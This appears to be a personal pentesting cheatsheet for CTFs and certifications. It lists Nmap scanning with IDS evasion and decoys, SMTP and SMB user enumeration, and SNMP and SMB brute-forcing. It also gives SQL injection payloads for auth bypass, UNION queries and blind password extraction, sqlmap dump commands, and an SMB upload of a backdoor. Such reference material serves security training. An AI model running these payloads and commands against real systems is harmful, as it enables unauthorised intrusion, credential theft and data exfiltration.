docs.title: Welcome to Pentest-CS 🎯
docs.text: A collection of cheatsheets for my adventures in CTFs, certifications, and beyond!

docs.title: 📝 Description
docs.text:
• Learn and create: Every time I discover something new, I add it to a cheatsheet.
  • Simplify searches: No more wasting time looking for moved resources.
  • Save time: Everything you need, all in one place.

docs.title: 🚀 Goal
docs.text: Build this documentation into an essential tool—complete it as much as possible!

docs.title: Network Mapping
docs.text: Network mapping in the context of penetration testing refers to the process of discovering and identifying devices, hosts, and network infrastructure elements within a target network.

docs.title: 🌍 Host Discovery
docs.text:
We can perform a pingsweeps by sending ICMP packets to each host of the range and wait for a response.

fping -g 172.31.0.0/24

We can also use Nmap : 

nmap -sn 192.168.1.0/24

With a target file : 

nmap -sn -iL targets.txt

Using SYN Ping scan (really useful !) : 

nmap -sn -PS 192.168.1.27

docs.title: 🎯 Port Scanning
docs.text:
Scan all ports with RustScan:

rustscan -a 10.10.10.10 -r 1-65535

Use RustScan with Nmap scripts :

rustscan -a 10.10.10.10 -r 1-65535 -- -A -oN nmap.txt

Simple scan with Nmap : 

nmap 10.10.10.1

Stealth Scan (RECOMMENDED) : 

nmap -sS 10.10.10.1

Important : If you are root, Nmap will perform a SYN Scan. If not, it will perform a TCP Scan. The difference is that SYN Scan doesn't create a TCP Connection (3 Way-Handshake).

UDP Scan : 

nmap -sU 10.10.10.1

Custom port range : 

nmap -p- 10.10.10.1
nmap -p1-5000 10.10.10.1
nmap -p80,443,3389,8080 10.10.10.1

docs.title: 🔍 Service Version and OS Detection
docs.text:
Get version of service : 

nmap -sV 10.10.10.1 -p8080,443

Get OS version : 

nmap -O 10.10.10.1

You can also use aggressive scan : 

nmap -A 10.10.10.1 -p80,8080,443

docs.title: 🛡️  Firewall Detection & IDS Evasion
docs.text:
Send fragmented packets : 

nmap -sS -p80,445,3389 -f --mtu 8 10.10.10.1

IP Address spoofing : 

nmap -sS -p80,445,3389 -f --mtu 8 -D 192.168.1.1 --data-length 200 192.168.1.24

Change source port with -g :

nmap -sS -p80,445,3389 -f --mtu 8 -g 53 -D 192.168.1.1 --data-length 200 192.168.1.24

Increase time delay (less suspicious): 

nmap -sS -p80,3389,445 -sV --scan-delay 15s 192.168.1.24

Same with -T option : 

nmap -sS -p80,3389,445 -sV -T1 192.168.1.24

docs.title: SMTP
docs.text: SMTP (Simple Mail Transfer Protocol) is a communication protocol that is used for the transmission of email.

docs.title: Version
docs.text:
Get the SMTP version :

# Metasploit Module :
use auxiliary/scanner/smtp/smtp_version

# Banner Grabbing :
nc -vn <IP> 25

docs.title: Username Enumeration
docs.text:
Source : HackTricks

Manually : This technique uses VRFY : 

$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
VRFY root
250 Super-User root@myhost
VRFY blah
550 blah... User unknown

There are other techniques ! Please check the HackTricks link !

Automatic : 

# smtp-user-enum :
Examples:

$ smtp-user-enum -M VRFY -U users.txt -t 10.0.0.1
$ smtp-user-enum -M EXPN -u admin1 -t 10.0.0.1
$ smtp-user-enum -M RCPT -U users.txt -T mail-server-ips.txt
$ smtp-user-enum -M EXPN -D example.com -U users.txt -t 10.0.0.1

# Metasploit Module :
use auxiliary/scanner/smtp/smtp_enum

docs.title: Send an email
docs.text:
# sendemail :
sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local -u Fakemail -m "Hi root, a fake from admin" -o tls=no

docs.title: SNMP
docs.text:
Simple Network Management Protocol (SNMP) is an Internet Standard protocol for collecting and organizing information about managed devices on IP networks and for modifying that information to change device behavior.

From Wikipedia

docs.title: 🔍 Nmap SE
docs.text:
Thanks to Nmap Script Engine, we can know more about SNMP service running on the target.

  • UDP port scan :
nmap -sU -p161,162 10.10.10.11
  • Use NSE :
nmap --script "snmp* and not snmp-brute" 10.10.10.11

docs.title: 🔑 Find valid community string
docs.text:
To find new community strings, we can use bruteforce.

  • Metasploit :
msf> use auxiliary/scanner/snmp/snmp_login
  • NSE : 
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
  • Other :
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp

docs.title: 📋 Enumerate community
docs.text:
When you find a valid community string, you can enumerate data and maybe find interesting stuff.

  • SnmpWalk :
snmpwalk -v 2c -c public 10.10.10.11
  • SnmpCheck : 
snmp-check 10.10.10.11 -p 161 -c public
  • SnmpBulkWalk : 
snmpbulkwalk -c public -v2c 10.10.10.11 .

Don't forget the . at the end !

docs.title: API Pentesting
docs.text:
API stands for Application Programming Interface.

Key terms :

  • Endpoints : locations where an API receives requests about a specific resource on its server

docs.title: 📚 Discover Documentation
docs.text:
If you find an endpoints like /api/v1/user/service, try to call each path section :

  • /api/v1/user
  • /api/v1
  • /api

Change also the request type : GET, POST, DELETE, ...

You'll maybe find interesting things...

docs.title: 🔍 Identifying endpoints
docs.text:
Try to find some endpoints by guessing common patterns like /api. Check all files that you found on the server (JS files, ...).

Change the HTTP method. An endpoint can have many options :

  • GET : /api/users -> List users
  • POST : /api/users -> Create user
  • DELETE : /api/users -> Delete user

Change Content-Type header. A json input can be filtrated but a XML not.

You can also try to bruteforce some endpoints/parameters with common API wordlist

docs.title: 🎯 Mass assignment
docs.text:
For example, if you have a GET request on /api/checkout : 

{
    "chosen_discount":{
        "percentage":0
    },
     "chosen_products":[{
         "product_id":"1",
         "name":"Lightweight \"l33t\" Leather Jacket",
         "quantity":1,
         "item_price":133700}]
}

And the POST request : 

{
    "chosen_products":[{
        "product_id":"1",
        "quantity":1}]
}

You can add parameters in the POST request like "percentage":100 to reduce the price for example.

docs.title: What is a SQL injection ?
docs.text:
According to PortSwigger, a SQL injection is :

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.

docs.title: Detect SQLi
docs.text: Source : https://github.com/payloadbox/sql-injection-payload-list

docs.title: Payloads
docs.text:
Test if there is an error, bug :

'
"
;
' or "
-- or #
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '

docs.title: Time Based SQLi
docs.text:
Source : https://github.com/payloadbox/sql-injection-payload-list

If the host wait 5 seconds, there is SQLi.

1 or sleep(5)#
');waitfor delay '0:0:5'--
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--

Try to change some chars like ‘ , ; , —, …

docs.title: Auth Bypass
docs.text:
Source : https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/

You can bypass a login form with SQLi.

or 1=1
or 1=1--
admin' or '1'='1
admin' or '1'='1'--
admin" or "1"="1
admin" or "1"="1"--
admin") or "1"="1"#

docs.title: UNION Attacks
docs.text:
Source : PortSwigger

To perform an UNION attack, you need to :

  1. Determine the number of columns
  2. Find column(s) with a useful data type (⚠️ Sometimes, return single column)
  3. Get database type and version
  4. List table(s) and column(s)
  5. Exploit

docs.title: Number of columns
docs.text:
There are many methods. This are the most used.

  • Use UNION SELECT :
    ' UNION SELECT NULL--
    ' UNION SELECT NULL,NULL--
    ' UNION SELECT NULL,NULL,NULL--

    ' UNION SELECT NULL#
    ' UNION SELECT NULL,NULL#
    ' UNION SELECT NULL,NULL,NULL#

If the number of nulls does not match the number of columns, the database returns an error.

  • Use ORDER BY :
    ' ORDER BY 1--
    ' ORDER BY 2--
    ' ORDER BY 3--

    ' ORDER BY 1#
    ' ORDER BY 2#
    ' ORDER BY 3#

Incrementing the specified column index until an error occurs.

When there is an error, it means that you found the number of columns.

Example : If 'ORDER BY 3-- print an error → 2 columns.

💡 Don’t forget to urlencode your payload ! (CTRL+U with BurpSuite)

docs.title: Useful data type
docs.text:
The most interesting data is in a string form, so we need to find it.

  • Check if a table is compatible with string :
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--

If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.

⚠️ Retrieving multiple values within a single column :

' UNION SELECT username || '~' || password FROM users-- In some cases the query in the previous example may only return a single column.

Example :

If the first column does not return string :

' UNION SELECT NULL,username || '~' || password FROM users—

docs.title: Database type and version
docs.text:
Queries to determine the database type and version :

Oracle SELECT version FROM v$instance MySQL SELECT @@version PostgreSQL SELECT version() SQLite sqlite_version()

Source : PortSwigger

docs.title: List tables and columns
docs.text: This is the most important step because we need to know the name of tables and columns to perform an exploit.

docs.title: List tables
docs.text:
We need to use information_schema.tables : 

' UNION SELECT table_name,table_type FROM information_schema.tables--

Now, choose one of them to list columns.

⁉️ Why `table_name` ? Why `table_type` ? When you query : `SELECT * FROM information_schema.tables` 
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
The ouput will be like this : By selecting `TABLE_NAME` , we’ll be able to list them.

docs.title: List columns
docs.text:
We need to use information_schema.columns :

' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_gbkncx'--

Source : PortSwigger

docs.title: Exploit
docs.text: Now, it’s really simple. Use information that you found to query the database.

docs.title: Blind SQL Injection
docs.text:
Source : PortSwigger

  • What is a Blind SQLI ?

    Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

docs.title: Password length
docs.text:
Before start to enum any password’s chars, it is important to know its lentgh.

TrackingId=vIwm93X71WwMfGey' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19) ='a'--

Start with 1 and increase until you get your response.

docs.title: Password enum
docs.text:
Now that you know how long is the password, you can test each letters and numbers.

If you want to try manually, you can follow this steps :

Check if it is a letter : 

TrackingId=vIwm93X71WwMfGey' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),5,1) > 'a'--

⚠️Don’t forget to try = 'a' !

💡 Try first with a, then g, p, w for example

Check if it is a number : 

TrackingId=vIwm93X71WwMfGey' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),5,1) > '5'--

Repeat the steps until you get the password.

docs.title: Oracle DB
docs.text:
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL Injection

List columns : 

category=Pets' UNION SELECT column_name,'a' FROM all_tab_columns WHERE table_name='USERS_MNRKDW'--

PortSwigger

docs.title: Installation
docs.text:
You can install with : sudo apt install sqlmap .

Or, you can copy the repository : https://github.com/sqlmapproject/sqlmap

If you use KaliLinux, the tool is already installed.

docs.title: Usage
docs.text:
• Scan a url :
sqlmap -u 'http://127.0.0.1/website/shop?id=1'
  • If SQLMap found a SQLi, you can enumerate DB, Tables and Columns :

To enum DB name : 

sqlmap -u 'http://127.0.0.1/website/shop?id=1' --dbs

To enum table name : 

sqlmap -u 'http://127.0.0.1/website/shop?id=1' -D db_name --tables

To enum column name :

sqlmap -u 'http://127.0.0.1/website/shop?id=1' -D db_name -T table_name --columns
  • Now, if you want to dump data :

To dump table content : 

sqlmap -u 'http://127.0.0.1/website/shop?id=1' -D db_name -T table_name --dump

To dump the full DB : 

sqlmap -u 'http://127.0.0.1/website/shop?id=1' --dump-all

⚠️ Very long sometimes !

  • Authenticated :

With cookies : 

sqlmap -u 'http://127.0.0.1/website/shop?id=1' --cookies='COOKIES-SESSIONS' --dbs

With basic auth: 

sqlmap -u 'http://127.0.0.1/website/shop?id=1' --auth-type Basic --auth-cred username:password --dbs

docs.title: BurpSuite tips
docs.text:
When you discover a new website, you probably use BurpSuite.

You can save a request and use it with SQLMap.

sqlmap -r request.req

docs.title: Refreshing
docs.text:
In some CTFs, I needed to use the following switch --fresh-queries because SQLMap store a session file.

sqlmap -u 'http://127.0.0.1/website/shop?id=1' --fresh-queries -D db_name -T table_name --dump

docs.title: Man page
docs.text: All options are available with sqlmap -hh and on the man page : https://manpages.org/sqlmap

docs.title: Enumeration
docs.text: Enumeration is the most important part during a pentest. Don't pass over !

docs.title: 🌐 DNS Enumeration
docs.text:
Enumerate information about DNS server.

  • dnsrecon on Kali Linux : 
dnsrecon -d https://zonetransfer.me

  • DNSDumpster

    Go to website and enter the target URL. The View Graph is useful !

docs.title: 🗂️  DNS Zone Transfer
docs.text:
It involves an attacker requesting and receiving a copy of the entire DNS database, also known as a zone file, from a DNS server.

  • dnsEnum : 
dnsenum zonetransfer.me
  • dig : 
dig axfr @NAMESERVER zonetransfer.me
  • fierce : 
fierce -dns zonetransfer.me

This tool can also brute-force subdomains.

docs.title: 🏠 Vhost Enumeration
docs.text:
To bruteforce vhost, you can use :

  • Ffuf :
ffuf -w /opt/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.hackme.htb" -u http://hackme.htb -fs 1495
  • wfuzz : 
wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.example.com" -u http://example.com

docs.title: 📂 Directory fuzzing
docs.text:
• Gobuster :
gobuster dir --url http://target.me/ -w /opt/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt,zip,bak
  • Gobuster with Basic Auth :
gobuster dir --url http://target.me/ -w /opt/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt,zip,bak -U admin -P admin
  • Dirb (for recursive mode) :
dirb http://target.me -o output.txt

docs.title: SMB
docs.text:
SMB stands for Server Message Block. It is a network file sharing protocol that allows applications on a computer to read and write to files and to request services from server programs in a computer network.

Source : Microsoft

docs.title: 📂 List shares
docs.text:
With nxc tool :

nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares

With smbMap, you can list shares and its content : 

smbmap -H 10.2.16.224 -u "administrator" -p "smbserver_771"
smbmap -H 10.2.16.224 -u "administrator" -p "smbserver_771" -r $SHARE

Download or Upload file : 

smbmap -H 10.2.16.224 -u "administrator" -p "password" --download "C/flag.txt"

smbmap -H 10.0.28.123 -u "administrator" -p 'password' --upload '/root/backdoor' 'C$\backdoor

With smbclient : 

smbclient -L //192.42.109.3/ -U ""

smbclient //192.42.109.3/public -U ""

docs.title: 🔍 Enumerate users
docs.text:
You can enumerate active users on the targets : 

# -a to enum all options
enum4linux -a <IP>

# With rpcclient : Connect then use enumdomusers
rpcclient -U "" -N <IP> 

# Metasploit Module :
use auxiliary/scanner/smb/smb_enumusers

docs.title: 🛠️  Bruteforce
docs.text:
This can be done with hydra : 

hydra -l Administrator -P /opt/rockyou.txt smb://<IP> -v -V
